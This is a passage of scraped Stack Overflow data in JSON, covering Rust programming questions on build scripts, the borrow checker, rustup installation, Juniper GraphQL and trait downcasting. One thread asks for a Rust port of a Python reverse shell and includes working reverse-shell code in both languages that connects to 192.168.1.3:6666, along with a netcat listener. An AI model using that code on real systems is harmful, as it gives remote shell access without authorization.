"https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519566290, "post_id": 48967583, "comment_id": 84953107, "body": "@Shepmaster I&#39;m aware of the differences. Please note that I&#39;m talking about building of a Cargo helper command, so the compilation target arch during helper&#39;s own compilation becomes the host arch once it&#39;s run."}], "answers": [{"comments": [{"owner": {"reputation": 90851, "user_id": 27009, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/f0a29af415477aa8c498a4f41ffe6640?s=128&d=identicon&r=PG", "display_name": "Kornel", "link": "https://stackoverflow.com/users/27009/kornel"}, "edited": false, "score": 0, "creation_date": 1519674527, "post_id": 48970885, "comment_id": 84997329, "body": "Thanks! I forgot <code>include_str!</code> exists. So that is marginally more straightforward than <code>include!</code>, but still uses <code>OUT_DIR</code>, so not as nice as I hoped."}, {"owner": {"reputation": 466742, "user_id": 224671, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/c90de868a7e95d75bdfd6a906dfedac7?s=128&d=identicon&r=PG", "display_name": "kennytm", "link": "https://stackoverflow.com/users/224671/kennytm"}, "edited": false, "score": 2, "creation_date": 1531414740, "post_id": 48970885, "comment_id": 89598590, "body": "Starting from Rust 1.19.0, you could supply the env var in build.rs as <code>println!(&quot;cargo:rustc-env=TARGET={}&quot;, var(&quot;TARGET&quot;).unwrap())</code>, and read it in main.rs as <code>const TARGET: &amp;str = env!(&quot;TARGET&quot;);</code>."}], "tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": false, "score": 2, "last_activity_date": 1519540304, "creation_date": 1519540304, "answer_id": 48970885, "question_id": 48967583, "link": "https://stackoverflow.com/questions/48967583/how-to-get-executables-full-target-triple-as-a-compile-time-constant-without-us/48970885#48970885", "title": "How to get executable&#39;s full target triple as a compile-time constant without using a build script?", "body": "<p>I don't think this is exposed other than through a build script. A concise way to get the target triple without \"dynamic source code generation\" would be, in <code>build.rs</code>:</p>\n\n<pre><code>fn main() {\n    print!(\"{}\", std::env::var(\"TARGET\").unwrap());\n}\n</code></pre>\n\n<p>and in <code>src/main.rs</code>:</p>\n\n<pre><code>const TARGET: &amp;str = include_str!(concat!(env!(\"OUT_DIR\"), \"/../output\"));\n\nfn main() {\n    println!(\"target = {:?}\", TARGET);\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 569, "user_id": 5805469, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/7dJe9.jpg?s=128&g=1", "display_name": "Ishan Jain", "link": "https://stackoverflow.com/users/5805469/ishan-jain"}, "is_accepted": true, "score": 2, "last_activity_date": 1531416558, "last_edit_date": 1531416558, "creation_date": 1531415697, "answer_id": 51311222, "question_id": 48967583, "link": "https://stackoverflow.com/questions/48967583/how-to-get-executables-full-target-triple-as-a-compile-time-constant-without-us/51311222#51311222", "title": "How to get executable&#39;s full target triple as a compile-time constant without using a build script?", "body": "<p>Build scripts print some <a href=\"https://doc.rust-lang.org/cargo/reference/build-scripts.html#outputs-of-the-build-script\" rel=\"nofollow noreferrer\">additional output</a> to a file so you can not be sure that build script only printed output of <code>$TARGET</code>. </p>\n\n<p>Instead, try something like this in build.rs:</p>\n\n<pre><code>fn main() {\n    println!(\n        \"cargo:rustc-env=TARGET={}\",\n        std::env::var(\"TARGET\").unwrap()\n    );\n}\n</code></pre>\n\n<p>This will fetch the value of the <code>$TARGET</code> environment variable in the build script and set it so it will be accessible when the program is started. </p>\n\n<p>In my main.rs:</p>\n\n<pre><code>const TARGET: &amp;str = env!(\"TARGET\");\n</code></pre>\n\n<p>Now I can access the target triplet in my program. If you are using this technique, you'll only read the value of the<code>TARGET</code> environment variable and nothing else. </p>\n"}], "owner": {"reputation": 90851, "user_id": 27009, "user_type": "registered", "accept_rate": 85, "profile_image": "https://www.gravatar.com/avatar/f0a29af415477aa8c498a4f41ffe6640?s=128&d=identicon&r=PG", "display_name": "Kornel", "link": "https://stackoverflow.com/users/27009/kornel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1599, "favorite_count": 0, "accepted_answer_id": 51311222, "answer_count": 2, "score": 5, "last_activity_date": 1531416558, "creation_date": 1519506216, "last_edit_date": 1519566482, "question_id": 48967583, "link": "https://stackoverflow.com/questions/48967583/how-to-get-executables-full-target-triple-as-a-compile-time-constant-without-us", "title": "How to get executable&#39;s full target triple as a compile-time constant without using a build script?", "body": "<p>I'm writing a Cargo helper command that needs to know the default target triple used by Rust/Cargo (which I presume is the same as host's target triple). Ideally it should be a compile-time constant.</p>\n\n<p>There's <a href=\"https://doc.rust-lang.org/nightly/std/env/consts/constant.ARCH.html\" rel=\"noreferrer\"><code>ARCH</code></a> constant, but it's not a full triple. For example, it doesn't distinguish between soft float and hard float ARM ABIs.</p>\n\n<p><code>env!(\"TARGET\")</code> would be ideal, but it's set only for build scripts, and not the lib/bin targets. I could pass it on to the lib with <code>build.rs</code> and dynamic source code generation (writing the value to an <code>.rs</code> file in <code>OUT_DIR</code>), but it seems like a heavy hack just to get one string that the compiler has to know anyway.</p>\n\n<p>Is there a more straightforward way to get the current target triple in lib/bin target built with Cargo?</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519506023, "post_id": 48967280, "comment_id": 84940700, "body": "Related: <a href=\"https://stackoverflow.com/q/41187296/155423\">Cannot borrow as immutable because it is also borrowed as mutable in function arguments</a>"}], "owner": {"reputation": 35, "user_id": 6684095, "user_type": "registered", "accept_rate": 50, "profile_image": "https://www.gravatar.com/avatar/1ba6c7b5270dead2ee7d296882b36d06?s=128&d=identicon&r=PG&f=1", "display_name": "Benjamin Konz", "link": "https://stackoverflow.com/users/6684095/benjamin-konz"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 176, "favorite_count": 0, "closed_date": 1519505800, "answer_count": 0, "score": 1, "last_activity_date": 1519505932, "creation_date": 1519504129, "last_edit_date": 1519505745, "question_id": 48967280, "link": "https://stackoverflow.com/questions/48967280/pass-struct-member-variables-by-value-when-calling-member-functions-of-the-same", "closed_reason": "Duplicate", "title": "Pass struct member variables by value when calling member functions of the same struct", "body": "<p>This Rust code does not compile:</p>\n\n<pre><code>struct Foo {\n    x: i32,\n}\n\nimpl Foo {\n    fn bar(&amp;mut self, x: i32) {}\n\n    fn foo(&amp;mut self) {\n        self.bar(self.x);\n    }\n}\n</code></pre>\n\n<p>It fails because of this lifetime error:</p>\n\n<pre><code>error[E0503]: cannot use `self.x` because it was mutably borrowed\n --&gt; src/main.rs:9:18\n  |\n9 |         self.bar(self.x);\n  |         ----     ^^^^^^ use of borrowed `*self`\n  |         |\n  |         borrow of `*self` occurs here\n</code></pre>\n\n<p>I don't understand why the Rust compiler has an issue with the above code. <code>x</code> gets passed by value, so there is no borrow occurring to any of <code>self</code>'s member variables when <code>bar</code> gets called. The <code>self</code> that bar gets is the same <code>self</code> that <code>foo</code> has, since a copy of the member variables is sent to <code>bar</code> during the function call.</p>\n\n<p>I don't see any logical reason why the code violates Rust's borrow mechanics.</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 5, "creation_date": 1519493542, "post_id": 48965158, "comment_id": 84937058, "body": "Seriously consider <i>not</i> doing this (or at least making it overridable at build time) because this completely precludes any ability to have a deterministic build."}, {"owner": {"reputation": 474, "user_id": 986896, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/1341de8fe6296871ae8395157ea4cde4?s=128&d=identicon&r=PG", "display_name": "Kuchara", "link": "https://stackoverflow.com/users/986896/kuchara"}, "edited": false, "score": 0, "creation_date": 1547832750, "post_id": 48965158, "comment_id": 95341769, "body": "<a href=\"https://reproducible-builds.org/docs/version-information/\" rel=\"nofollow noreferrer\">reproducible-builds.org/docs/version-information</a>  and  <a href=\"https://reproducible-builds.org/docs/timestamps/\" rel=\"nofollow noreferrer\">reproducible-builds.org/docs/timestamps</a>"}, {"owner": {"reputation": 18987, "user_id": 2470818, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/c3e0df5ee75b18ce0c8aeadf4433e151?s=128&d=identicon&r=PG&f=1", "display_name": "vallentin", "link": "https://stackoverflow.com/users/2470818/vallentin"}, "edited": false, "score": 0, "creation_date": 1562102505, "post_id": 48965158, "comment_id": 100270261, "body": "For anyone interested, I&#39;ve made a self-contained tutorial with some snippets, about <a href=\"https://vallentin.io/2019/06/06/versioning\" rel=\"nofollow noreferrer\">generating version strings</a>."}], "answers": [{"tags": [], "owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "is_accepted": true, "score": 2, "last_activity_date": 1519493476, "creation_date": 1519493476, "answer_id": 48965642, "question_id": 48965158, "link": "https://stackoverflow.com/questions/48965158/is-there-an-rust-equivalent-to-the-c-preprocessors-date-and-time-macros/48965642#48965642", "title": "Is there an Rust equivalent to the C preprocessor&#39;s __DATE__ and __TIME__ macros?", "body": "<p>No, there is not. Use a <a href=\"https://doc.rust-lang.org/cargo/reference/build-scripts.html\" rel=\"nofollow noreferrer\">build script</a> instead.</p>\n\n<p>See also:</p>\n\n<ul>\n<li><a href=\"https://stackoverflow.com/q/43753491/155423\">Include git commit hash as string into Rust program</a></li>\n</ul>\n"}], "owner": {"reputation": 91, "user_id": 8178705, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6faa6cc783a165b25fc1c8f3154ba449?s=128&d=identicon&r=PG", "display_name": "Steffen Vogel", "link": "https://stackoverflow.com/users/8178705/steffen-vogel"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 646, "favorite_count": 1, "accepted_answer_id": 48965642, "answer_count": 1, "score": 4, "last_activity_date": 1519493476, "creation_date": 1519490663, "last_edit_date": 1519493313, "question_id": 48965158, "link": "https://stackoverflow.com/questions/48965158/is-there-an-rust-equivalent-to-the-c-preprocessors-date-and-time-macros", "title": "Is there an Rust equivalent to the C preprocessor&#39;s __DATE__ and __TIME__ macros?", "body": "<p>I am looking for a way to embed the compile-time date and time into my program output for debugging purposes.</p>\n"}, {"tags": ["installation", "rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 0, "creation_date": 1519649954, "post_id": 48964252, "comment_id": 84982763, "body": "Please read the linked duplicate&#39;s answer, which has a section starting with &quot;It goes on to describe how to change the defaults&quot;"}, {"owner": {"user_type": "does_not_exist", "display_name": "user8664650"}, "reply_to_user": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 1, "creation_date": 1519750456, "post_id": 48964252, "comment_id": 85032591, "body": "@Shepmaster Thanks. Sorry I din&#39;t read it completely but now it solved .Thanks"}], "owner": {"user_type": "does_not_exist", "display_name": "user8664650"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 53, "favorite_count": 0, "closed_date": 1519493668, "answer_count": 0, "score": 0, "last_activity_date": 1519531116, "creation_date": 1519484779, "last_edit_date": 1519531116, "question_id": 48964252, "link": "https://stackoverflow.com/questions/48964252/how-to-install-rust-custum-folder-in-linux", "closed_reason": "Duplicate", "title": "How to install rust custum folder in linux?", "body": "<p>I want to learn Rust so I want to install it. I useally install everything on /opt . But rustup is installing rust in ~/.cargo . I don't want to put it in my home folder. I tried to cut-pasting ~/.cargo to /opt/Rust and setting evn variables but then rustup command don't work correctly</p>\n\n<p>I want to install rust beta version in /opt/Rust in Linux. How can I do that ?</p>\n\n<p>I don't want to where rustup install's rust but want to know how to change it</p>\n"}, {"tags": ["rust", "graphql"], "answers": [{"comments": [{"owner": {"reputation": 11878, "user_id": 588759, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/216ea4da5cae7be4030b6242ab90631c?s=128&d=identicon&r=PG", "display_name": "rofrol", "link": "https://stackoverflow.com/users/588759/rofrol"}, "edited": false, "score": 0, "creation_date": 1519547688, "post_id": 48970981, "comment_id": 84948568, "body": "Thanks, I got to the same. But now when I try to use it like <code>RootNode::new(             Database::new(),             EmptyMutation::&lt;Database&gt;::new(),     );</code> I got error: the trait <code>juniper::GraphQLType</code> is not implemented for <code>model::Database</code>;"}, {"owner": {"reputation": 2692, "user_id": 625791, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/996a20b9eae1def21e8db462e9bf1cf7?s=128&d=identicon&r=PG", "display_name": "theduke", "link": "https://stackoverflow.com/users/625791/theduke"}, "edited": false, "score": 1, "creation_date": 1519584839, "post_id": 48970981, "comment_id": 84959308, "body": "@dtolnay jup, thanks for jumping in here. The _internal attribute is a hack to make the derives, defined in the juniper_codegen crate, work inside the main juniper crate (neccessary for fixing the input paths used)."}, {"owner": {"reputation": 2692, "user_id": 625791, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/996a20b9eae1def21e8db462e9bf1cf7?s=128&d=identicon&r=PG", "display_name": "theduke", "link": "https://stackoverflow.com/users/625791/theduke"}, "reply_to_user": {"reputation": 11878, "user_id": 588759, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/216ea4da5cae7be4030b6242ab90631c?s=128&d=identicon&r=PG", "display_name": "rofrol", "link": "https://stackoverflow.com/users/588759/rofrol"}, "edited": false, "score": 0, "creation_date": 1519584927, "post_id": 48970981, "comment_id": 84959348, "body": "@rofrol if you still have issues, feel free to ask on Gitter, I&#39;m available tonight."}], "tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": false, "score": 2, "last_activity_date": 1519541107, "creation_date": 1519541107, "answer_id": 48970981, "question_id": 48962903, "link": "https://stackoverflow.com/questions/48962903/juniper-and-graphqlenum-unresolved-import-inputvalue/48970981#48970981", "title": "Juniper and GraphQLEnum - unresolved import InputValue", "body": "<p>The code around where the error is pointing is:</p>\n\n<pre><code>#[derive(GraphQLEnum, Copy, Clone, Eq, PartialEq, Debug)]\n#[graphql(_internal)]\npub enum Episode {\n    #[graphql(name = \"NEW_HOPE\")] NewHope,\n    Empire,\n    Jedi,\n}\n</code></pre>\n\n<p>It looks like you copied everything including the <code>#[graphql(_internal)]</code> attribute. Judging by the name, this is intended to be used only internally within the juniper test suite and not by downstream crates like yours. After removing the <code>_internal</code> attribute things should work. Tested with the following lib.rs:</p>\n\n<pre><code>#[macro_use]\nextern crate juniper;\n\nmod model;\n</code></pre>\n"}], "owner": {"reputation": 11878, "user_id": 588759, "user_type": "registered", "accept_rate": 67, "profile_image": "https://www.gravatar.com/avatar/216ea4da5cae7be4030b6242ab90631c?s=128&d=identicon&r=PG", "display_name": "rofrol", "link": "https://stackoverflow.com/users/588759/rofrol"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 274, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1519649083, "creation_date": 1519475552, "question_id": 48962903, "link": "https://stackoverflow.com/questions/48962903/juniper-and-graphqlenum-unresolved-import-inputvalue", "title": "Juniper and GraphQLEnum - unresolved import InputValue", "body": "<p>I need help with juniper</p>\n\n<p>I've copied this file <a href=\"https://github.com/graphql-rust/juniper/blob/master/juniper/src/tests/model.rs\" rel=\"nofollow noreferrer\">https://github.com/graphql-rust/juniper/blob/master/juniper/src/tests/model.rs</a> to my project.</p>\n\n<p>But when I <code>cargo run</code>, I get:</p>\n\n<pre class=\"lang-bash prettyprint-override\"><code>error[E0432]: unresolved import `InputValue`\n--&gt; src/model.rs:5:10\n|\n5 | #[derive(GraphQLEnum, Copy, Clone, Eq, PartialEq, Debug)]\n| \n\n     ^^^^^^^^^^^ no `InputValue` in the root\n</code></pre>\n\n<p>I added <code>InputValue</code> to <code>main.rs</code>, then compiler wanted another <code>use</code>s. So even with this in <code>main.rs</code>:</p>\n\n<pre class=\"lang-rust prettyprint-override\"><code>use juniper::InputValue;\nuse juniper::Value;\nuse juniper::ToInputValue;\nuse juniper::FromInputValue;\nuse juniper::Executor;\n</code></pre>\n\n<p>I got:</p>\n\n<pre class=\"lang-sh prettyprint-override\"><code>error[E0365]: `InputValue` is private, and cannot be reexported\n--&gt; src/model.rs:5:10\n|\n5 | #[derive(GraphQLEnum, Copy, Clone, Eq, PartialEq, Debug)]\n|          ^^^^^^^^^^^ reexport of private `InputValue`\n|\n= note: consider declaring type or module `InputValue` with `pub`\n\nerror[E0365]: `Value` is private, and cannot be reexported\n--&gt; src/model.rs:5:10\n|\n5 | #[derive(GraphQLEnum, Copy, Clone, Eq, PartialEq, Debug)]\n|          ^^^^^^^^^^^ reexport of private `Value`\n|\n= note: consider declaring type or module `Value` with `pub`\n</code></pre>\n\n<p>and so on...</p>\n"}, {"tags": ["python", "sockets", "rust", "subprocess", "reverse-shell"], "answers": [{"tags": [], "owner": {"reputation": 6357, "user_id": 6086311, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/cb99289473f6393b89474785f2d294d1?s=128&d=identicon&r=PG", "display_name": "dtolnay", "link": "https://stackoverflow.com/users/6086311/dtolnay"}, "is_accepted": true, "score": 4, "last_activity_date": 1519542952, "creation_date": 1519542952, "answer_id": 48971180, "question_id": 48958814, "link": "https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python/48971180#48971180", "title": "What is the Rust equivalent of a reverse shell script written in Python?", "body": "<p>The equivalent of your Python reverse shell in Rust would be:</p>\n\n<pre><code>use std::net::TcpStream;\nuse std::os::unix::io::{AsRawFd, FromRawFd};\nuse std::process::{Command, Stdio};\n\nfn main() {\n    let s = TcpStream::connect(\"192.168.1.3:6666\").unwrap();\n    let fd = s.as_raw_fd();\n    Command::new(\"/bin/sh\")\n        .arg(\"-i\")\n        .stdin(unsafe { Stdio::from_raw_fd(fd) })\n        .stdout(unsafe { Stdio::from_raw_fd(fd) })\n        .stderr(unsafe { Stdio::from_raw_fd(fd) })\n        .spawn()\n        .unwrap()\n        .wait()\n        .unwrap();\n}\n</code></pre>\n"}], "owner": {"reputation": 54, "user_id": 8534797, "user_type": "registered", "profile_image": "https://lh6.googleusercontent.com/-YatF6TxGsNk/AAAAAAAAAAI/AAAAAAAAAA0/n4DE7c41PWk/photo.jpg?sz=128", "display_name": "springworks00", "link": "https://stackoverflow.com/users/8534797/springworks00"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 1089, "favorite_count": 2, "accepted_answer_id": 48971180, "answer_count": 1, "score": 4, "last_activity_date": 1587663603, "creation_date": 1519440235, "last_edit_date": 1587663603, "question_id": 48958814, "link": "https://stackoverflow.com/questions/48958814/what-is-the-rust-equivalent-of-a-reverse-shell-script-written-in-python", "title": "What is the Rust equivalent of a reverse shell script written in Python?", "body": "<p>A reverse shell script in Python normally looks something like this: </p>\n\n<pre class=\"lang-py prettyprint-override\"><code>import socket, subprocess, os;\n\ns=socket.socket(socket.AF_INET,socket.SOCK_STREAM);\n\ns.connect((\\\"192.168.1.3\\\", 6666));\n\nos.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);\n\np=subprocess.call([\\\"/bin/sh\\\", \\\"-i\\\"]);\n</code></pre>\n\n<p>I am trying to duplicate this process with Rust:</p>\n\n<pre><code>let mut stream = std::net::TcpStream::connect(\"192.168.1.3:6666\").unwrap();\n</code></pre>\n\n<p>I only got as far as getting a TCP connection to my host machine, listening with netcat (<code>nc -l -p 6666</code>). If I understand correctly, I need to redirect standard input, output, and error, through the socket and then somehow \"call\" <code>/bin/sh</code>. </p>\n\n<p>How do I write this reverse shell script in Rust?</p>\n"}, {"tags": ["dynamic", "plugins", "rust"], "comments": [{"owner": {"reputation": 17608, "user_id": 3650362, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fqdi1.jpg?s=128&g=1", "display_name": "trentcl", "link": "https://stackoverflow.com/users/3650362/trentcl"}, "edited": false, "score": 0, "creation_date": 1519440864, "post_id": 48958093, "comment_id": 84924515, "body": "Can you rephrase <i>convert a type of elements in the collection to arbitrary(original) interface type (trait)</i>? Maybe a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> would help. Is the shared library loading essential to the problem?"}, {"owner": {"reputation": 25137, "user_id": 4498831, "user_type": "registered", "accept_rate": 92, "profile_image": "https://i.stack.imgur.com/jDBV2.png?s=128&g=1", "display_name": "Boiethios", "link": "https://stackoverflow.com/users/4498831/boiethios"}, "reply_to_user": {"reputation": 17608, "user_id": 3650362, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fqdi1.jpg?s=128&g=1", "display_name": "trentcl", "link": "https://stackoverflow.com/users/3650362/trentcl"}, "edited": false, "score": 0, "creation_date": 1519458835, "post_id": 48958093, "comment_id": 84927544, "body": "@trentcl I don&#39;t think so. If I understand well, the OP wants a FFI with C++"}, {"owner": {"reputation": 4594, "user_id": 1478356, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/996ee463b8f6b17a738f2e23f7ecfe9f?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/1478356/stefan"}, "edited": false, "score": 1, "creation_date": 1519466565, "post_id": 48958093, "comment_id": 84929271, "body": "Use <code>x.downcast_ref().unwrap()</code> instead of <code>magic_conversion&lt;&amp;A&gt;(x)</code>.  No idea whether trait objects work across FFI-boundary; but certainly not with C++ (you need to forward every C++ type you want to recognize in Rust explicitly as a separate Rust type)."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7038168"}, "reply_to_user": {"reputation": 17608, "user_id": 3650362, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fqdi1.jpg?s=128&g=1", "display_name": "trentcl", "link": "https://stackoverflow.com/users/3650362/trentcl"}, "edited": false, "score": 0, "creation_date": 1519468764, "post_id": 48958093, "comment_id": 84929765, "body": "@trentcl Boiethios is right, the problem is not with having a collection as it&#39;s presented in &#39;possible duplicate&#39;. And yes, I intend to use <i>dynamic_cast</i> during FFI, but with Rust shared lib, not C++, so there shouldn&#39;t be problems with recognition which Stefan mentioned"}, {"owner": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 0, "creation_date": 1519468907, "post_id": 48958093, "comment_id": 84929803, "body": "@OktavianClemens: Actually, it <i>is</i> a problem because Rust doesn&#39;t have a defined ABI.  You&#39;d have to ensure the shared library was compiled with the <i>exact</i> same compiler and compilation options, and all the transitive dependencies were exactly the same... at which point, you might as well just use static linking for all the difference it makes.  Also, given that you appear to be trying to cast to an interface, I don&#39;t think what you want is possible.  Rust doesn&#39;t have interfaces, and it doesn&#39;t have &quot;cross casting&quot; (<i>i.e.</i> between interfaces).  I suspect more details might help."}, {"owner": {"user_type": "does_not_exist", "display_name": "user7038168"}, "reply_to_user": {"reputation": 44438, "user_id": 42353, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/f05e802879a805c03a55645dfcc0d4ea?s=128&d=identicon&r=PG", "display_name": "DK.", "link": "https://stackoverflow.com/users/42353/dk"}, "edited": false, "score": 0, "creation_date": 1519471726, "post_id": 48958093, "comment_id": 84930611, "body": "@DK thank you for response, I didn&#39;t expect such complications with rust-to-rust FFI. But static linking is not an option, because the problem began with me trying to create &quot;dynamic module loader&quot; .  For more details, I can provide <a href=\"https://github.com/Donaim/DModuler\" rel=\"nofollow noreferrer\">my C# implementation</a> of one such loader (trivial to achieve in c#).   Also I&#39;ve had an idea, to use <a href=\"https://github.com/Donaim/rust_libloading\" rel=\"nofollow noreferrer\">rust-libloading</a> &#39;s  <code>Symbol</code> and, for some reason, it worked for me on Linux, and didn&#39;t on Windows10 ( <a href=\"https://github.com/Donaim/rust-first/tree/master/hello_dynamic\" rel=\"nofollow noreferrer\">code</a> )."}], "answers": [{"tags": [], "owner": {"reputation": 17608, "user_id": 3650362, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/Fqdi1.jpg?s=128&g=1", "display_name": "trentcl", "link": "https://stackoverflow.com/users/3650362/trentcl"}, "is_accepted": true, "score": 3, "last_activity_date": 1519475888, "last_edit_date": 1519475888, "creation_date": 1519474251, "answer_id": 48962707, "question_id": 48958093, "link": "https://stackoverflow.com/questions/48958093/is-there-a-way-to-convert-a-trait-reference-to-an-object-of-another-unconnected/48962707#48962707", "title": "Is there a way to convert a trait reference to an object of another unconnected type?", "body": "<p>I think what you're looking for is <a href=\"https://doc.rust-lang.org/std/any/trait.Any.html#method.downcast_ref\" rel=\"nofollow noreferrer\"><code>downcast_ref::&lt;A&gt;</code></a>:</p>\n\n<pre><code>let y: &amp;TargetTrait = Any::downcast_ref::&lt;A&gt;(x).expect(\"Expected an A\");\n</code></pre>\n\n<p>You have to specify the <em>concrete</em> type <code>A</code>. <code>Any</code> trait objects don't hold any information about what traits the underlying type implements, so you can't \"cross-cast\" from <code>&amp;Any</code> to <code>&amp;TargetTrait</code> directly; you have to know the underlying type.</p>\n\n<p>The <code>expect</code> will panic if <code>downcast_ref</code> returns <code>None</code>; if that's not what you want, you have to decide what you want to happen when <code>x</code> is not an <code>A</code> and match against the result of <code>downcast_ref</code> instead.</p>\n"}], "owner": {"user_type": "does_not_exist", "display_name": "user7038168"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 241, "favorite_count": 0, "closed_date": 1519493916, "accepted_answer_id": 48962707, "answer_count": 1, "score": 3, "last_activity_date": 1519493867, "creation_date": 1519432328, "last_edit_date": 1519493867, "question_id": 48958093, "link": "https://stackoverflow.com/questions/48958093/is-there-a-way-to-convert-a-trait-reference-to-an-object-of-another-unconnected", "closed_reason": "Duplicate", "title": "Is there a way to convert a trait reference to an object of another unconnected type?", "body": "<p>I have a collection of interfaces that are loaded dynamically from shared libraries. I want to be able to convert those <em>downcasted</em> interfaces to their original type (trait).</p>\n\n<pre><code>struct A {}\nfn abstract_a&lt;'l&gt;() -&gt; &amp;'l Any { return &amp;A{} }\n\ntrait TargetTrait { fn some_method(); }\nimpl TargetTrait for A { fn some_method() { println!(\"HELLO\"); } }    \n\nfn main() {\n    let x: &amp;Any = abstract_a();\n    let y: &amp;TargetTrait = magic_conversion&lt;&amp;TargetTrait&gt; (x);\n}\n// question: does 'magic_conversion'(or 'dynamic_cast') exist? what is it?\n</code></pre>\n\n<p>While loading these is not a problem, I have no idea how to get <em>target</em> functionality with such interface. In other words:</p>\n\n<pre><code>/* simplified for readability */\n// this part is known\nlet some_lib = loadlib(\"path/to/lib.so\")\nlet some_interface: &amp;Any = some_lib.loadfunc&lt;&amp;Any&gt;(\"constructor_func\")()\n    /* loader does not know what target type constructor has, so it presumes 'Any' */\n\n// the problem:\nlet dependent_class = Some(class)\ndependent_class.graphics = dynamic_cast&lt;IGraphics&gt;(some_interface)\n</code></pre>\n\n<p>In this example, <code>dependent_class</code> uses an extern interface and does not care about handling libloading and all of that complicated stuff.\nIf there is another way to achieve my goal, I would also be very happy to see it, but the only solution I came up with is 'dynamic_cast'</p>\n"}, {"tags": ["rust"], "comments": [{"owner": {"reputation": 269539, "user_id": 155423, "user_type": "registered", "accept_rate": 90, "profile_image": "https://www.gravatar.com/avatar/419218774d04a581476ea1887a0921e0?s=128&d=identicon&r=PG", "display_name": "Shepmaster", "link": "https://stackoverflow.com/users/155423/shepmaster"}, "edited": false, "score": 1, "creation_date": 1519494482, "post_id": 48957517, "comment_id": 84937321, "body": "I recommend reading <a href=\"https://doc.rust-lang.org/book/second-edition/\" rel=\"nofollow noreferrer\"><i>The Rust Programming Language</i></a> to become familiar with basic concepts in Rust, such as <a href=\"https://doc.rust-lang.org/book/second-edition/ch06-00-enums.html\" rel=\"nofollow noreferrer\">enums</a>."}, {"owner": {"reputation": 2369, "user_id": 4614680, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/c9b36fb2c1d356a919916f77e74f1c3c?s=128&d=identicon&r=PG&f=1", "display_name": "Philipp Ludwig", "link": 